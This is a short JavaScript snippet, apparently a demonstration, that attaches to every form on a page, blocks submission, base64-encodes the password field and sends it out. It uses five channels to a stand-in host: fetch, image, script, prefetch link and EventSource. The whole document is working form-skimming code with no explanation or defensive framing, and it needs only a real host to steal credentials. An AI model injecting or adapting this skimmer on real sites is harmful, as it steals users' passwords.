Array.from(document.querySelectorAll('form'))
    .map(form => {
        console.log('evil script attached', form)
        form.addEventListener('submit', event => {
            event.preventDefault()
            console.log('evil script sending')
            const passwordField = form.querySelector('input[type=password]')
            const payload = btoa(passwordField.value)
            senders.map(sender => sender(payload))
            return false
        })
    })

const senders = [
    payload => fetch(`https://example.com/?q=${payload}`),
    payload => {
        const i = document.createElement('img')
        i.setAttribute('src', `https://example.com/?q=${payload}`)
        document.body.appendChild(i)
    },
    payload => {
        const i = document.createElement('script')
        i.setAttribute('src', `https://example.com/?q=${payload}`)
        document.body.appendChild(i)
    },
    payload => {
        const l = document.createElement('link')
        l.rel = 'prefetch'
        l.href = `https://example.com/?q=${payload}`
        document.head.appendChild(l)
    },
    payload => new EventSource(`https://example.com/?q=${payload}`),
]
